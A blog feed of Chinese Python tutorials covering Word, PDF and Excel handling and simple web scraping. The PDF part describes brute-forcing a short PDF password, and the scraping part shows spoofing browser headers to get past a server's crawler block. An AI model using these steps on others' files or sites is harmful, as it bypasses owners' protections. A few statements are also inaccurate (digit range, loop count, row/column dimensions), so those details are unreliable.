<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from docx.shared import Inches</span><br><span class="line">mydoc.add_picture(&#39;image_file&#39;,width&#x3D;Inches(宽度值))</span><br></pre></td></tr></table></figure>
<h2 id="建立表格"><a href="#建立表格" class="headerlink" title="建立表格"></a>建立表格</h2><p>add_table( )方法可以建立表格。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">table &#x3D; mydoc.add_table(rows&#x3D;?,cols&#x3D;?) #执行完返回table表格对象</span><br></pre></td></tr></table></figure>
<h4 id="建立表格内容"><a href="#建立表格内容" class="headerlink" title="建立表格内容"></a>建立表格内容</h4><p>一次处理一列的表格内容，如下：</p>
<p>row = table.rows[0]</p>
<p>row.cell[0].text = ‘表格(0,0)的内容’</p>
<p>row.cell[1].text = ‘表格(0,1)的内容’</p>
<h4 id="插入表格列"><a href="#插入表格列" class="headerlink" title="插入表格列"></a>插入表格列</h4><p>使用add_row( )插入表格列。</p>
<h4 id="打印表格内容"><a href="#打印表格内容" class="headerlink" title="打印表格内容"></a>打印表格内容</h4><p>可以使用双层循环打印表格内容：</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009152358214.png" alt="image-20201009152358214"></p>
<h4 id="表格的样式"><a href="#表格的样式" class="headerlink" title="表格的样式"></a>表格的样式</h4><p>可以使用table.style设定框线。</p>
<p>设定表格的样式，LightShading是浅色底纹，Accent1是辅色1，若是调整为Accent2，……，Accent6将有不同的结果，LightShading-Accept1。</p>
<h2 id="paragraph样式"><a href="#paragraph样式" class="headerlink" title="paragraph样式"></a>paragraph样式</h2><p>Paragraph样式就是所谓的段落样式，下列是常见的Word样式内容。</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009152616751.png" alt="image-20201009152616751"></p>
<p>在插入段落时，可以在add_paragraph( )方法内增加第2个参数“style=样式名称”，这样就可以在插入段落同时设定段落的样式。</p>
<h2 id="Run的样式"><a href="#Run的样式" class="headerlink" title="Run的样式"></a>Run的样式</h2><p>Run的样式重点就是设定Run的文字(text)属性，下列是常见的属性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bold 粗体</span><br><span class="line">italic 斜体</span><br><span class="line">underline 下划线</span><br><span class="line">strike 删除线</span><br></pre></td></tr></table></figure>
<p>当我们建立一个Run对象时，会回传Run对象，此时若将此对象的样式设为True，相当于可以建立该Run对象的样式。</p>
<p>如建立Run内容，然后设定此内容的属性为粗体(bold)与斜体：</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86word%E6%96%87%E4%BB%B6/image-20201009153002680.png" alt="image-20201009153002680"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-处理PDF文件</title>
    <url>/2020/10/09/Python-%E5%A4%84%E7%90%86PDF%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<p>需要使用外部模块PyPDF2，安装此模块时指令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install PyPDF2</span><br></pre></td></tr></table></figure>
<p>导入模块指令为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import PyPDF2</span><br></pre></td></tr></table></figure>
<h2 id="打开PDF文件"><a href="#打开PDF文件" class="headerlink" title="打开PDF文件"></a>打开PDF文件</h2><p>使用open( )打开PDF文件，语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mypdf &#x3D; open(&#39;pdf_file&#39;,&#39;rb&#39;)  #rb代表以二进制打开</span><br></pre></td></tr></table></figure>
<p>pdf_file是要打开的文件，打开成功后会传回所打开PDF文件的文件对象。</p>
<h2 id="获得PDF文件的页数"><a href="#获得PDF文件的页数" class="headerlink" title="获得PDF文件的页数"></a>获得PDF文件的页数</h2><p>打开PDF文件成功后，可以使用PdfFileReader( )方法读取这个PDF文件，语法为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pdfrd &#x3D; PyPDF2.PdfFileReader(mypdf)  读取PDF内容</span><br></pre></td></tr></table></figure>
<p>将所读取的内容放在pdfRd对象变量内，这个对象变量内含numPages属性记录此PDF文件的页数。</p>
<p>如计算travel.pdf的页数：</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86PDF%E6%96%87%E4%BB%B6/image-20201009170922330.png" alt="image-20201009170922330"></p>
<h2 id="读取PDF页面内容"><a href="#读取PDF页面内容" class="headerlink" title="读取PDF页面内容"></a>读取PDF页面内容</h2><p>使用PdfFileReader( )方法读取这个PDF文件后，可以使用getPage(n)取得第n页的PDF内容，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pdfcontent &#x3D; pdfrd.getPage(n)  #读取第n页内容</span><br></pre></td></tr></table></figure>
<p>PDF页面也是从第0页开始计算，页面内容被读入pdfContentObj对象后，可以使用extractText( )取得该页的字符串内容。需留意，PyPDF2模块对于读取英文文件，比较没有障碍，对于中文内容会出现乱码。另外，PyPDF2无法读取图表或表格数据。</p>
<p>如读取travel.pdf的第0页内容：</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86PDF%E6%96%87%E4%BB%B6/image-20201009173327722.png" alt="image-20201009173327722"></p>
<h2 id="检查PDF是否加密"><a href="#检查PDF是否加密" class="headerlink" title="检查PDF是否加密"></a>检查PDF是否加密</h2><p>初次执行“pdfRd = PyPDF2.PdfFileReader(pdfObj)”之后，pdfRd对象会有isEncryted属性，如果此属性是True，表示文件有加密。如果此属性是False，表示文件没有加密。</p>
<p>检查文件是否加密：</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86PDF%E6%96%87%E4%BB%B6/image-20201009174520989.png" alt="image-20201009174520989"></p>
<h2 id="解密PDF文件"><a href="#解密PDF文件" class="headerlink" title="解密PDF文件"></a>解密PDF文件</h2><p>对于加密的PDF文件，我们可以使用decrypt( )执行解密，如果解密成功decrypt( )会传回1，如果失败则传回0。使用decrypt( )解密时，是解pdfRd对象的密码不是整份PDF，未来如果其他程序要使用这个PDF，仍须执行解密才可阅读使用。</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86PDF%E6%96%87%E4%BB%B6/image-20201010105023956.png" alt="image-20201010105023956"></p>
<h2 id="PDF页面的旋转"><a href="#PDF页面的旋转" class="headerlink" title="PDF页面的旋转"></a>PDF页面的旋转</h2><p>在浏览PDF文件时，可以旋转PDF页面。rotateClockwise( )可以执行页面顺时针旋转，rotateCounterClockwise( )可以执行逆时针旋转。在这2个方法内可以传入90、180、270度执行旋转工作。</p>
<p>如将travel.pdf的第0页旋转90度，然后存入out18_7.pdf：</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86PDF%E6%96%87%E4%BB%B6/image-20201010105210795.png" alt="image-20201010105210795"></p>
<h2 id="加密PDF文件"><a href="#加密PDF文件" class="headerlink" title="加密PDF文件"></a>加密PDF文件</h2><p>要将PDF文件加密，可以在将pdfWr对象正式使用write( )方法写入前调用encrypt( )执行，加密的密码当作参数放在encrypt( )方法内。</p>
<p>如将travel.pdf文件加密储存在output.pdf内，密码是deepstone。</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86PDF%E6%96%87%E4%BB%B6/image-20201010105319452.png" alt="image-20201010105319452"></p>
<h2 id="python破解密码"><a href="#python破解密码" class="headerlink" title="python破解密码"></a>python破解密码</h2><p>如果密码是由3个阿拉伯数字组成，表示有3个位数，每个位数是由0-1所组成。</p>
<p>破解3位数字的密码，破解程序执行过程会将所测试失败的密码不断打印出来直到找到密码。</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86PDF%E6%96%87%E4%BB%B6/image-20201010105623720.png" alt="image-20201010105623720"></p>
<p>如果密码位数比较多，只要增加循环数即可。密码一般是由英文字母组成，其实用英文字母也可以，只不过是增加一些转换上的问题。</p>
<p>如设定密码位数有3位，是由纯英文字母大写所组成。由于有26个英文字母，所以所有循环均是执行26圈，range(1, 26)，由于字母A的Unicode是65，所以i1(i2或i3也是)值加上64就会是相对应的英文字母。</p>
<p><img src="/2020/10/09/Python-%E5%A4%84%E7%90%86PDF%E6%96%87%E4%BB%B6/image-20201010105757455.png" alt="image-20201010105757455"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-处理excel文件</title>
    <url>/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<p>Excel是电子表格软件，主要是做数据的统计与分析。有时候我们可能会需要从数百或更多电子表格中依条件复制一些数据到其他表格，或是从数百或更多数据表中搜寻符合特定条件的数据等，这些皆是符合使用Python处理的条件。</p>
<p>需要使用外部模块openpyxl,安装指令为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install openpyxl</span><br></pre></td></tr></table></figure>
<p>导入模块指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import openpyxl</span><br></pre></td></tr></table></figure>
<h2 id="EXCEL窗口"><a href="#EXCEL窗口" class="headerlink" title="EXCEL窗口"></a>EXCEL窗口</h2><p>Microsoft Excel窗口如下：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010110629013.png" alt="image-20201010110629013"></p>
<p>Microsoft Excel文件的扩展名是xlsx，下列是一些基本名词。</p>
<p>1、工作簿(workbook)：Excel的文件又称工作簿。</p>
<p>2、工作表(worksheet)：一个工作簿由不同数量的工作表组成。</p>
<p>3、栏(column)：工作表的栏名称是A、B、……</p>
<p>4、行(row)：工作表的行名称是1、2、……</p>
<p>5、单元格(cell)：工作表内的每一个格子称单元格，用(栏名, 行名)代表。</p>
<h2 id="读取EXCEL文件"><a href="#读取EXCEL文件" class="headerlink" title="读取EXCEL文件"></a>读取EXCEL文件</h2><h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>导入openpyxl模块后，可以使用openpyxl.load_workbook( )方法打开Excel文件，然后可以回传Excel文件对象。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010111007456.png" alt="image-20201010111007456"></p>
<h4 id="取得工作表worksheet名称"><a href="#取得工作表worksheet名称" class="headerlink" title="取得工作表worksheet名称"></a>取得工作表worksheet名称</h4><p>可以使用get_sheet_names( )取得所打开工作簿文件的所有工作表，工作表将以列表数据类型回传。get_active_sheet( )可以取得当前工作表的名称，这里所指的当前工作表是打开文件后自动显示的工作表名称。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010111132003.png" alt="image-20201010111132003"></p>
<h4 id="设定当前工作的工作表"><a href="#设定当前工作的工作表" class="headerlink" title="设定当前工作的工作表"></a>设定当前工作的工作表</h4><p>使用Python操作Excel文件时，可能需随时更改当前工作表，可以使用get_sheet_by_name( )，然后将要设为当前工作表的名称当做这个方法的参数。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010111430749.png" alt="image-20201010111430749"></p>
<h4 id="取得工作表的内容"><a href="#取得工作表的内容" class="headerlink" title="取得工作表的内容"></a>取得工作表的内容</h4><p>有了当前工作表对象ws，可以用下列方式取得单元格内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ws[&#39;栏行&#39;].value   #栏是A、B，行是1、2</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010111645958.png" alt="image-20201010111645958"></p>
<p>除了可以使用value属性取得单元格内容外，也可以使用row、column或coordinate取得单元格相对位置信息。</p>
<h4 id="取得工作表内容的栏数和行数"><a href="#取得工作表内容的栏数和行数" class="headerlink" title="取得工作表内容的栏数和行数"></a>取得工作表内容的栏数和行数</h4><p>对于当前工作表对象而言，max_column和max_row可以分别传回工作表内容的栏数和行数。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010111822823.png" alt="image-20201010111822823"></p>
<h4 id="取得单元格的内容"><a href="#取得单元格的内容" class="headerlink" title="取得单元格的内容"></a>取得单元格的内容</h4><p>使用“ws[‘栏列’].value”取得单元格内容，也可以使用cell( )方法取得单元格内容，此时其语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ws.cell(column&#x3D;N,row&#x3D;M)  #N是栏编号，M是行编号</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010112107454.png" alt="image-20201010112107454"></p>
<h4 id="工作表对象的rows和columns"><a href="#工作表对象的rows和columns" class="headerlink" title="工作表对象的rows和columns"></a>工作表对象的rows和columns</h4><p>当建立工作表对象ws成功后，会自动产生下列数据产生器(generators)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ws.rows:数据产生器以行的方式包裹</span><br><span class="line">ws.columns:数据产生器以栏的方式包裹</span><br></pre></td></tr></table></figure>
<p>由于ws.rows和ws.columns是数据产生器，若是想取得它的内容须先将它们转成列表(list)，然后就可以用索引方式取得。列出特定行与栏的信息。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010113605914.png" alt="image-20201010113605914"></p>
<p>对于数据产生器而言，我们可以使用逐行方式获得全部的工作表内容。</p>
<p>如使用逐行方式获取工作表全部内容：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010113728116.png" alt="image-20201010113728116"></p>
<p>使用逐栏方式获得全部的工作表内容：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010113905254.png" alt="image-20201010113905254"></p>
<h4 id="用整数取代域名"><a href="#用整数取代域名" class="headerlink" title="用整数取代域名"></a>用整数取代域名</h4><p>在Excel中栏名称是A、B、…、Z、AA、AB、AC、……例如，1代表A、2代表B、26代表Z、27代表AA、28代表AB。如果工作表的栏数很多，无法清楚了解到底索引是多少，转化方法为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get_column_letter(数值)   #将数值转化为字母</span><br><span class="line">column_index_from_string(字母)  #将字母转化为数值</span><br></pre></td></tr></table></figure>
<p>方法存在于openpyxl.utils模块内，程序前面要加上下列指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from openpyxl.utils import get_column_letter,column_index_from_string</span><br></pre></td></tr></table></figure>
<p>如将字段的字母转成数值与将数值转成字母：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010114530962.png" alt="image-20201010114530962"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010114607986.png" alt="image-20201010114607986"></p>
<h4 id="切片读取"><a href="#切片读取" class="headerlink" title="切片读取"></a>切片读取</h4><p>使用切片的观念读取某区间数据，例如，读取A3:E6数据可用下列方法：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010114705059.png" alt="image-20201010114705059"></p>
<h2 id="写入EXCEL文件"><a href="#写入EXCEL文件" class="headerlink" title="写入EXCEL文件"></a>写入EXCEL文件</h2><h4 id="建立EXCEL文件"><a href="#建立EXCEL文件" class="headerlink" title="建立EXCEL文件"></a>建立EXCEL文件</h4><p>openpyxl.Workbook( )可以建立空白的工作簿，默认所建立的文件是可擦写，如果想要设为只写模式，可以加上write_only=True参数。</p>
<h4 id="存储EXCEL文件"><a href="#存储EXCEL文件" class="headerlink" title="存储EXCEL文件"></a>存储EXCEL文件</h4><p>save( )方法可以存储Excel文件，这个方法需由Excel文件对象启动，先前我们是使用wb(workbook)当作文件对象的变量，使用语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wb.save(文件名)</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010120423938.png" alt="image-20201010120423938"></p>
<h4 id="复制excel文件"><a href="#复制excel文件" class="headerlink" title="复制excel文件"></a>复制excel文件</h4><p>可以打开文件，然后新名称存储文件方式达到复制Excel文件的效果。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010120853984.png" alt="image-20201010120853984"></p>
<h4 id="建立工作表"><a href="#建立工作表" class="headerlink" title="建立工作表"></a>建立工作表</h4><p>create_sheet( )可以在工作簿内建立新的工作表。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010121838590.png" alt="image-20201010121838590"></p>
<h4 id="删除工作表"><a href="#删除工作表" class="headerlink" title="删除工作表"></a>删除工作表</h4><p>删除工作表可以使用remove_sheet( )方法，在使用时并不是直接将工作表名称当参数，必须使用工作簿对象wb调用get_sheet_by_name( )当作参数。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010122006529.png" alt="image-20201010122006529"></p>
<h4 id="写入单元格"><a href="#写入单元格" class="headerlink" title="写入单元格"></a>写入单元格</h4><p>如果想要写入资料，只要设定该单元格的值即可。</p>
<p>如将资料写入单元格：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010122307377.png" alt="image-20201010122307377"></p>
<h4 id="将列表数据写入单元格"><a href="#将列表数据写入单元格" class="headerlink" title="将列表数据写入单元格"></a>将列表数据写入单元格</h4><p>可以使用append( )方法将列表资料写入单元格，append这个名词有附加的意义，如果当前工作表没有资料，append( )可将数据从第一行(row)开始写入，如果当前工作表已经有数据，可将数据从已有数据的下一行开始写入。</p>
<p>如在空白工作表使用append( )输入列表数据：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010122542596.png" alt="image-20201010122542596"></p>
<h2 id="设定单元格的字体"><a href="#设定单元格的字体" class="headerlink" title="设定单元格的字体"></a>设定单元格的字体</h2><h4 id="font"><a href="#font" class="headerlink" title="font()"></a>font()</h4><p>Font对象主要功能是执行字体相关的设定，可以使用Font( )方法设定此对象，有了Font对象后就可以将它应用在单元格。这个方法常见的参数如下：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010122701729.png" alt="image-20201010122701729"></p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010122755848.png" alt="image-20201010122755848"></p>
<h4 id="字体色彩的设定"><a href="#字体色彩的设定" class="headerlink" title="字体色彩的设定"></a>字体色彩的设定</h4><p>所有颜色可以使用3个原色red(红色)、green(绿色)和blue(蓝色)，每个颜色数值在0—255间组成。Font( )方法内的参数color的值“FFFFFF”，分别代表Red、Green和Blue，下列是常见的256种颜色组合。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010123010251.png" alt="image-20201010123010251"></p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010123052984.png" alt="image-20201010123052984"></p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010123119468.png" alt="image-20201010123119468"></p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010123144636.png" alt="image-20201010123144636"></p>
<h2 id="数学公式的使用"><a href="#数学公式的使用" class="headerlink" title="数学公式的使用"></a>数学公式的使用</h2><p>常见的数学公式如下：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010123337671.png" alt="image-20201010123337671"></p>
<p>如计算B1:B3单元格区间的加总、平均、最高分、最低分。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010123518713.png" alt="image-20201010123518713"></p>
<h2 id="设定单元格高度宽度"><a href="#设定单元格高度宽度" class="headerlink" title="设定单元格高度宽度"></a>设定单元格高度宽度</h2><p>单元格预设的高度是12.75pt，72pt等于1英寸。可以使用column_dimensions属性设定行高。单元格默认的宽度是8.43个英文字符宽度，可以使用row_dimensions设定单元格的宽度。如果将高度或宽度设为0，则具有隐藏单元格效果。</p>
<p>如设定第一行(row)高度和第B栏(column)宽度：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010123642323.png" alt="image-20201010123642323"></p>
<h2 id="单元格对齐方式"><a href="#单元格对齐方式" class="headerlink" title="单元格对齐方式"></a>单元格对齐方式</h2><p>可以使用Alignment( )方法，须在程序前方导入下列模块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from openpyxl.styles import Alignment</span><br></pre></td></tr></table></figure>
<p>Alignment( )方法内可以有下列2个参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">horizontal：可以设定left(靠左)、center(居中)、right(靠右)对齐。</span><br><span class="line"></span><br><span class="line">vertical：可以设定top(靠上)、center(居中)、bottom(靠下)对齐。</span><br></pre></td></tr></table></figure>
<p>整个单元格设定的完整公式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ws[&#39;A1&#39;].alignment &#x3D; Alignment()</span><br></pre></td></tr></table></figure>
<h2 id="合并单元格"><a href="#合并单元格" class="headerlink" title="合并单元格"></a>合并单元格</h2><h4 id="合并单元格-1"><a href="#合并单元格-1" class="headerlink" title="合并单元格"></a>合并单元格</h4><p>可以使用merge_cells( )合并单元格，可以合并同一行(row)、同一栏(column)或一个区间的单元格。</p>
<h4 id="取消合并单元格"><a href="#取消合并单元格" class="headerlink" title="取消合并单元格"></a>取消合并单元格</h4><p>可以使用unmerge_cells( )取消合并单元格。</p>
<h2 id="建立图表"><a href="#建立图表" class="headerlink" title="建立图表"></a>建立图表</h2><p>Python可以建立的图表有许多，所有Excel可以建立的图表皆可使用Python建立，为了建立图表可以更方便地导入图表模块，程序需导入下列图表方法。BarChart(柱形图)、BarChart3D(3D柱形图)、PieChart(饼图)、PieChart3D(3D饼图)、BubbleChart(泡泡图)、AreaChart(分区图)、AreaChart3D(3D分区图)、LineChart(线段图)、LineChart3D(3D线段图)、RadarChart(雷达图)、StockChart(股票图)。上述英文名称就是建立图表的方法，导入方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from openpyxl.chart import BarChart,Reference #以导入BarChart为例</span><br></pre></td></tr></table></figure>
<p>另外需导入Reference方法，这个方法主要是供我们将建立图表所需的工作表数据或是卷标名称(有时也可称轴的卷标)数据导入所建的图表对象内。</p>
<h4 id="柱形图"><a href="#柱形图" class="headerlink" title="柱形图"></a>柱形图</h4><p>最常见的图表应用，主要是显示多组数据于一段时间的变化，从此类型也可以了解各组资料间比较的情形，应用时通常数值数据是在纵轴(y轴)，而标记是在横轴(x轴)。</p>
<p>如建立深石软件2020—2021年销售报表。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010124641750.png" alt="image-20201010124641750"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010124706829.png" alt="image-20201010124706829"></p>
<h4 id="3D柱形图"><a href="#3D柱形图" class="headerlink" title="3D柱形图"></a>3D柱形图</h4><p>要建立3D柱形图表，只要导入BarChart3D。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010124945532.png" alt="image-20201010124945532"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010125008131.png" alt="image-20201010125008131"></p>
<h4 id="饼图"><a href="#饼图" class="headerlink" title="饼图"></a>饼图</h4><p>饼图(PieChart)只适合一个数据系列，主要是供了解单笔数据相对于整体数据的关系比。</p>
<p>如将员工旅游意向调查表处理成饼图：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010125118771.png" alt="image-20201010125118771"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010125146949.png" alt="image-20201010125146949"></p>
<h4 id="3D饼图"><a href="#3D饼图" class="headerlink" title="3D饼图"></a>3D饼图</h4><p>要建立3D饼图表就很简单，只要导入PieChart3D。</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010125237535.png" alt="image-20201010125237535"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E5%A4%84%E7%90%86excel%E6%96%87%E4%BB%B6/image-20201010125300188.png" alt="image-20201010125300188"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-网络爬虫</title>
    <url>/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="浏览网页"><a href="#浏览网页" class="headerlink" title="浏览网页"></a>浏览网页</h2><p>Python有提供webbrowser模块，可以调用这个模块的open( )方法，就可以打开指定的网页了。在使用前需导入此模块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import webbrowser</span><br></pre></td></tr></table></figure>
<p>如打开百度：</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010131307765.png" alt="image-20201010131307765"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010131401320.png" alt="image-20201010131401320"></p>
<h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>requests是第三方模块，安装模块指令为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>
<h4 id="下载网页"><a href="#下载网页" class="headerlink" title="下载网页"></a>下载网页</h4><p>requests.get( )方法内需放置欲下载网页信息的网址当参数，这个方法可以传回网页的HTML源文件。</p>
<p>使用requests.get( )之后传回的数据类型是Response对象。</p>
<h4 id="Response对象"><a href="#Response对象" class="headerlink" title="Response对象"></a>Response对象</h4><p>Response对象内有下列几个重要属性：</p>
<p>status_code：如果值是requests.codes.ok，表示获得的网页内容成功。</p>
<p>text：网页内容。</p>
<p>如打印网页原始内容：</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010131817536.png" alt="image-20201010131817536"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010131839717.png" alt="image-20201010131839717"></p>
<h4 id="搜索网页特定内容"><a href="#搜索网页特定内容" class="headerlink" title="搜索网页特定内容"></a>搜索网页特定内容</h4><p>网页内容下载后，如果我们想要搜寻特定字符串，可以使用许多方法。</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010131958962.png" alt="image-20201010131958962"></p>
<h4 id="网页服务器阻挡造成读取错误"><a href="#网页服务器阻挡造成读取错误" class="headerlink" title="网页服务器阻挡造成读取错误"></a>网页服务器阻挡造成读取错误</h4><p>有些网页也许基于安全原因，或是不想让太多网络爬虫造访造成网络流量增加，因此会设计程序阻挡网络爬虫提取信息，碰上这类问题就会产生406的错误，如下所示：</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010132122203.png" alt="image-20201010132122203"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010132144213.png" alt="image-20201010132144213"></p>
<p>406错误就是网页服务器阻挡。</p>
<h4 id="爬虫伪装成浏览器"><a href="#爬虫伪装成浏览器" class="headerlink" title="爬虫伪装成浏览器"></a>爬虫伪装成浏览器</h4><p>为了解决爬虫程序被服务器阻挡的困扰，我们可以将所设计的爬虫程序伪装成浏览器，方法是在程序前端加上headers内容。</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010132308670.png" alt="image-20201010132308670"></p>
<h4 id="存储下载的网页"><a href="#存储下载的网页" class="headerlink" title="存储下载的网页"></a>存储下载的网页</h4><p>使用requests.get( )获得网页内容时，是存储在Response对象类型内，如果要将这类型的对象存入硬盘内，需使用Response对象的iter_content( )方法，这个方法是采用重复迭代方式将Response对象内容写入指定的文件内，每次写入指定扇区大小是以Bytes为单位，一般可以设定1024×5或1024×10或更多。</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010132437922.png" alt="image-20201010132437922"></p>
